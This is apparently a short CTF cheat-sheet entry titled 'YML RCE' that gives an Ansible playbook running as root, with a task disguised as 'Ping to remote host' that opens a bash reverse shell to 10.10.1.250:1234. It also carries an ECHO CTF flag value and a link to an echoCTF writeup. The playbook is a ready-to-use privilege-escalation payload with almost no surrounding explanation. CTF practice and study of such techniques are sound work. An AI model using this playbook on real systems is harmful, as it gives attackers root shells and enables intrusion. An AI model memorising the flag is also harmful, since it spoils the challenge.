#### YML RCE
Example to obtain a reverse shell using test.yml file:
```yml
---
- name: Display known facts for host
  hosts: 127.0.0.1
  sudo: true
  sudo_user: root
  connection: local
  gather_facts: false
  tasks:
  - name: Ping to remote host
    shell:
        "bash -c 'bash -i >& /dev/tcp/10.10.1.250/1234 0>&1'"
  - name: Display all variables/facts known for a host (ETSCTF_eaef34dcbadbe832d98163f825a98a51)
    debug:
      var: hostvars[inventory_hostname]
      verbosity: 4
```
Consider identation.
Examples:
[ECHO CTF martin](https://echoctf.red/target/8/writeup/read/60)